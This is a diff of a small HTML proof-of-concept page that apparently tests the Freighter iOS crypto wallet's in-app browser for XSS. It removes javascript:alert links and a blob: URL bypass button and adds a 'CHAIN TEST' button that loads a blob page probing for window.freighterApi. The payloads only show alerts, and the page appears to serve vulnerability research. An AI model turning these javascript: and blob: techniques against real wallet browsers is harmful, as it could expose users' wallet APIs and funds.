@@ -1,18 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Freighter XSS PoC - 0x403for</title>
-</head>
-<body style="background:#0a0a0a;color:#fff;font-family:monospace;text-align:center;padding-top:80px">
-<h2>Freighter iOS - javascript: PoC</h2>
-<p>Tap link dibawah - jika muncul alert 1 = VULN</p>
-<br><br>
-<a href="javascript:alert(1)" style="background:#7B61FF;color:#fff;padding:16px 32px;border-radius:12px;text-decoration:none;font-weight:700">CLICK ME - javascript:alert(1)</a>
-<br><br><br>
-<a href="javascript:alert('freighterApi:'+typeof window.freighterApi+'\nurl:'+location.href)" style="background:#222;color:#fff;padding:12px 20px;border-radius:10px;text-decoration:none;font-size:12px">TEST freighterApi exists</a>
-<br><br><br>
-<button onclick="const b=new Blob(['<script>alert(`blob: freighterApi=${typeof freighterApi}`)</script>'],{type:'text/html'}); location.href=URL.createObjectURL(b)" style="background:#ff3355;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-weight:700">TEST blob: bypass</button>
-</body>
-</html>
+<button onclick="
+  const html = \`
+    <h1>aqua.network loaded in blob</h1>
+    <script>
+      setTimeout(()=>{
+        alert('freighterApi:'+typeof window.freighterApi+' url:'+location.href)
+      },1000)
+    <\/script>
+  \`;
+  const blob = new Blob([html], {type:'text/html'});
+  location.href = URL.createObjectURL(blob);
+">CHAIN TEST - blob + freighterApi</button>
